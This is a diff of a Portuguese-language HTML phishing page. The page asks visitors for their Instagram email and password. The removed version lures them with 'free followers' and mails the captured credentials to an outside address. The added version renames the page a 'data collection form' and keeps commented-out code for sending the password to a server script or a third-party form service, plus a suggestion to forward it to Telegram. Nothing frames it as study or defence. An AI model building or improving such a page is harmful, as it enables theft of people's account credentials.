@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>💥seguidores instagram gratis💥</title>
+    <title>Formulário de Coleta de Dados do Instagram</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -44,31 +44,33 @@
 </head>
 <body>
     <div class="container">
-        <h1>💥Seguidores instagram gratis💥</h1>
+        <h1>Coleta de Dados do Instagram</h1>
         <p>Informe seu email e senha do Instagram:</p>
-        <input type="email" id="email" placeholder="Seu e-mail">
-        <input type="password" id="password" placeholder="Senha do Instagram">
-        <button onclick="sendCredentials()">Enviar</button>
+        <form>
+            <input type="email" id="email" placeholder="Seu e-mail">
+            <input type="password" id="password" placeholder="Senha do Instagram">
+            <button type="button" onclick="submitForm()">Enviar</button>
+        </form>
     </div>
 
     <script>
-        function sendCredentials() {
+        function submitForm() {
             var email = document.getElementById('email').value;
             var password = document.getElementById('password').value;
 
-            // Aqui você pode adicionar a lógica para enviar as credenciais para o seu email
-            var subject = 'Credenciais do Instagram';
-            var body = 'Email do Instagram: ' + email + '\n' +
-                       'Senha do Instagram: ' + password;
-            var mailtoLink = 'mailto:leozm85@gmwil.com=' + encodeURIComponent(subject) + '&body=' + encodeURIComponent(body);
-            window.location.href = mailtoLink;
+            // Aqui você pode adicionar a lógica para enviar os dados para o seu servidor ou serviço de terceiros
+            // Por exemplo, você pode usar AJAX para fazer uma requisição para o seu servidor
+            // Ou você pode usar um serviço de formulário de contato online que encaminha as mensagens para o seu Telegram
+            // Por questões de segurança, não é recomendado lidar com senhas diretamente no lado do cliente (no navegador)
 
-            // Limpa os campos após enviar
-            document.getElementById('email').value = '';
-            document.getElementById('password').value = '';
+            // Exemplo de envio de dados para o servidor usando AJAX (necessita de código do servidor para processar os dados)
+            // var xhttp = new XMLHttpRequest();
+            // xhttp.open('POST', 'process_form.php', true);
+            // xhttp.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+            // xhttp.send('email=' + encodeURIComponent(email) + '&password=' + encodeURIComponent(password));
 
-            // Exibe uma mensagem de confirmação
-            alert('Credenciais enviadas com sucesso para o seu email!');
+            // Exemplo de redirecionamento para um serviço de formulário de contato online
+            // window.location.href = 'https://seu-servico-de-formulario.com?email=' + encodeURIComponent(email) + '&password=' + encodeURIComponent(password);
         }
     </script>
 </body>
